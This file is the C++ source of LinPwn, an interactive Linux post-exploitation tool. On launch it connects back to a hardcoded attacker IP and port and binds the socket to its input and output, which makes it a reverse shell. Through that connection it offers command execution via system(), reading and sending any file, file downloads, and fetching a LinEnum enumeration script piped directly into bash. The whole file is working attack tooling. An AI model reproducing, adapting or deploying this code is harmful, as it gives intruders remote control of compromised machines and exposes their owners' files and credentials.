/* LinPwn
   
   Interactive Post Exploitation Tool  

   Copyright (C) 2019  Andromeda3(3XPL017)

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program. If not, see <https://www.gnu.org/licenses/>.
*/

#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <csignal>
#include <string>

#define BUFFER 200
#define SD 0


void get_input(char *option) {
  fgets(option, BUFFER, stdin);

  for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
    if (option[i] == '\n') {
      option[i] = '\0';
    }
  }
}

void help() {
  std::string newline = "\n\0";
  std::string options = "\x1b[32mOptions \n";
  std::string seperator = "====================================="
      "==========================\n";
  std::string banner = "banner - displays the banner.\n";
  std::string modules = "modules - lists modules.\n";
  std::string clear = "clear - clears the screen.\n";
  std::string exits = "exit - or press ^C to quit LinPwn.\n";

  write(SD, newline.data(), newline.length());
  write(SD, options.data(), options.length());
  write(SD, seperator.data(), seperator.length());
  write(SD, banner.data(), banner.length());
  write(SD, modules.data(), modules.length());
  write(SD, clear.data(), clear.length());
  write(SD, exits.data(), exits.length());
  write(SD, newline.data(), newline.length());
}

class Banner {
 public:
  void print_banner() {
    get_banner();
    get_sysinfo();
    get_user();
    get_uid();
    get_pwd();
    get_home();
    get_shell();
    get_term();
    get_path();
  }

 private:
  void get_banner() {
    std::string newline = "\n\0";
    std::string title = "\x1b[32mLinPwn\nCreated By Andromeda.\n";

    write(SD, title.data(), title.length());
    write(SD, newline.data(), newline.length());
  }

  void get_sysinfo() {
    struct utsname utsinfo;
    uname(&utsinfo);
    std::string sysname = utsinfo.sysname;
    std::string nodename = utsinfo.nodename;
    std::string release = utsinfo.release;
    std::string version = utsinfo.version;
    std::string machine = utsinfo.machine;
    std::string domainname = utsinfo.domainname;
    std::string newline = "\n\0";
    std::string systems = "System: ";
    std::string space = " ";

    write(SD, systems.data(), systems.length());
    write(SD, sysname.data(), sysname.length());
    write(SD, space.data(), space.length());
    write(SD, nodename.data(), nodename.length());
    write(SD, space.data(), space.length());;
    write(SD, release.data(), release.length());
    write(SD, space.data(), space.length());
    write(SD, version.data(), version.length());
    write(SD, space.data(), space.length());
    write(SD, machine.data(), machine.length());
    write(SD, space.data(), space.length());
    write(SD, domainname.data(), domainname.length());
    write(SD, newline.data(), newline.length());
  }

  void get_user() {
    std::string newline = "\n\0";
    std::string env = "User: ";
    std::string none = "none\n";
    std::string username = getenv("USER");

    write(SD, env.data(), env.length());

    if (!getenv("USER")) {
      write(SD, none.data(), none.length());
      return;
    }

    write(SD, username.data(), username.length());
    write(SD, newline.data(), newline.length());
  }

  void get_uid() {
    int uid = getuid();
    std::string newline = "\n\0";
    std::string env = "UID: ";
    std::string uidstr = std::to_string(uid);

    write(SD, env.data(), env.length());
    write(SD, uidstr.data(), uidstr.length());
    write(SD, newline.data(), newline.length());
  }

  void get_pwd() {
    std::string newline = "\n\0";
    std::string env = "Pwd: ";
    std::string none = "none\n";
    std::string pwd = getenv("PWD");

    write(SD, env.data(), env.length());

    if (!getenv("PWD")) {
      write(SD, none.data(), none.length());
      return;
    }

    write(SD, pwd.data(), pwd.length());
    write(SD, newline.data(), newline.length());
  }

  void get_home() {
    std::string newline = "\n\0";
    std::string env = "Home: ";
    std::string none = "none\n";
    std::string home = getenv("HOME");

    write(SD, env.data(), env.length());

    if (!getenv("HOME")) {
      write(SD, none.data(), none.length());
      return;
    }

    write(SD, home.data(), home.length());
    write(SD, newline.data(), newline.length());
  }

  void get_shell() {
    std::string newline = "\n\0";
    std::string env = "Shell: ";
    std::string none = "none\n";
    std::string shell = getenv("SHELL");

    write(SD, env.data(), env.length());

    if (!getenv("SHELL")) {
      write(SD, none.data(), none.length());
      return;
    }

    write(SD, shell.data(), shell.length());
    write(SD, newline.data(), newline.length());
  }

  void get_term() {
    std::string newline = "\n\0";
    std::string env = "Term: ";
    std::string none = "none\n";
    std::string term = getenv("TERM");

    write(SD, env.data(), env.length());

    if (!getenv("TERM")) {
      write(SD, none.data(), none.length());
      return;
    }

    write(SD, term.data(), term.length());
    write(SD, newline.data(), newline.length());
  }

  void get_path() {
    std::string newline = "\n\0";
    std::string env = "Path: ";
    std::string none = "none\n";
    std::string path = getenv("PATH");

    write(SD, env.data(), env.length());

    if (!getenv("PATH")) {
      write(SD, none.data(), none.length());
      return;
    }

    write(SD, path.data(), path.length());
    write(SD, newline.data(), newline.length());
  }
};

class Connection {
 public:
  void connection_open() {
    const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(connecting, (struct sockaddr *)&address, sizeof(address));
    dup2(connecting, SD);
    dup2(connecting, 1);
  }

 private:
  const char *ip = "192.168.1.165";  // Change this
  const int port = 8000;  // Change this
  struct sockaddr_in address;
};

class Commands {
 public:
  void list_Modules() {
    std::string newline = "\n\0";
    std::string modules = "\x1b[32mModules \n";
    std::string seperator = "====================================="
      "==========================\n";
    std::string shell = "shell - Executes /bin/sh\n";
    std::string read_file = "readfile - Print the contents of a file\n";
    std::string enumerate = "enumerate - Download and run LinEnum "
      "(requires internet access)\n";
    std::string download = "download - Downloads a file\n";

    write(SD, newline.data(), newline.length());
    write(SD, modules.data(), modules.length());
    write(SD, seperator.data(), seperator.length());;
    write(SD, shell.data(), shell.length());
    write(SD, read_file.data(), read_file.length());
    write(SD, enumerate.data(), enumerate.length());
    write(SD, download.data(), download.length());
    write(SD, newline.data(), newline.length());;
  }

  void shell() {
    std::string green = "\x1b[32m ";
    std::string shell = "\x1b[31m(LinPwn: Shell) > ";
    std::string exe = "\x1b[32mExecuting /bin/sh\n";
    std::string exits = "Type exit to return to LinPwn.\n";
    char option[BUFFER];
    // const char *errors = " 2>/dev/null";
    const char *errors = " 2>&0";

    write(SD, exe.data(), exe.length());
    write(SD, exits.data(), exits.length());

    for (;;) {
      write(SD, shell.data(), shell.length());
      write(SD, green.data(), green.length());
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        strncat(option, errors, BUFFER);
        system(option);
      }
    }
  }

  void read_file() {
    std::string green = "\x1b[32m ";
    std::string contents = "\x1b[32mType full path of file"
      "to view contents...\n";
    std::string exits = "Type exit to return to LinPwn.\n";
    char option[BUFFER];

    write(SD, contents.data(), contents.length());
    write(SD, exits.data(), exits.length());

    for (;;) {
      write(SD, green.data(), green.length());
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        open_file(option);
      }
    }
  }

  void enumeration() {
    std::string error0 = "\x1b[33mIf LinEnum didnt run curl"
      " or wget may not be installed\n";
    std::string error1 = "or you do not have internet access\n";
    const char *curl = "curl https://raw.githubusercontent.com/"
      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";
    const char *wget = "wget -O - https://raw.githubusercontent.com/"
      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";

    if (check_curl) {
      system(curl);
      return;
    } else if (check_wget) {
      system(wget);
      return;
    }

    write(SD, error0.data(), error0.length());
    write(SD, error1.data(), error1.length());
    return;
  }

  void download() {
    std::string url = "\x1b[32mEnter the URL of the target "
      "file to download it\n";
    std::string downloads = "\x1b[31m(LinPwn: Download) > ";
    std::string green = "\x1b[32m ";
    std::string curl_error = "\x1b[33mCurl or Wget is not installed\n";
    char *command = new char[BUFFER];
    const char *curl = "curl ";
    const char *wget = "wget ";
    const char *errors = " 2>/dev/null";
    char option[BUFFER];

    if (check_curl) {
      strncat(command, curl, BUFFER);
    } else if (check_wget) {
      strncat(command, wget, BUFFER);
    } else {
      write(SD, curl_error.data(), curl_error.length());
      return;
    }

    write(SD, url.data(), url.length());
    write(SD, downloads.data(), downloads.length());
    write(SD, green.data(), green.length());
    get_input(option);
    strncat(command, option, BUFFER);
    strncat(command, errors, BUFFER);
    system(command);
    delete[] command;
  }

 private:
  std::string error = "\x1b[33m Cannot open file.\n";
  FILE *check_curl = fopen("/usr/bin/curl", "rb");
  FILE *check_wget = fopen("/usr/bin/wget", "rb");

  void open_file(char *option) {
    FILE *file = fopen(option, "rb");

    if (!file) {
      write(SD, error.data(), error.length());
      return;
    }

    fseek(file, 0, SEEK_END);
    int size = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *filecontent = new char[size];

    fread(filecontent, 1, size, file);
    filecontent[size] = '\0';
    send(SD, filecontent, size, 0);
    fclose(file);
    delete[] filecontent;
  }
};

int handler() {
  Banner banner;
  Commands commands;
  std::string not_valid = "\x1b[33mNot a valid option\n";
  char *option = new char[BUFFER];
  get_input(option);

  if (strncmp(option, "shell\0", 6) == 0) {
    commands.shell();
  } else if (strncmp(option, "readfile\0", 9) == 0) {
    commands.read_file();
  } else if (strncmp(option, "enumerate\0", 9) == 0) {
    commands.enumeration();
  } else if (strncmp(option, "modules\0", 9) == 0) {
    commands.list_Modules();
  } else if (strncmp(option, "download\0", 9) == 0) {
    commands.download();
  } else if (strncmp(option, "exit\0", 5) == 0) {
    return 1;
  } else if (strncmp(option, "clear\0", 6) == 0) {
    system("clear");
  } else if (strncmp(option, "help\0", 5) == 0) {
    help();
  } else if (strncmp(option, "banner\0", 7) == 0) {
    banner.print_banner();
  } else if (strncmp(option, "", 1) == 0) {
    return 0;
  } else {
    write(SD, not_valid.data(), not_valid.length());
  }

  delete[] option;
  return 0;
}

void main_loop() {
  std::string linpwn = "\x1b[31m(LinPwn) > ";
  std::string green = "\x1b[32m ";

  do {
    write(SD, linpwn.data(), linpwn.length());
    write(SD, green.data(), green.length());
  } while (handler() != 1);
}

int main() {
  Banner banner;
  Connection connection;
  connection.connection_open();
  banner.print_banner();
  main_loop();
  return 0;
}
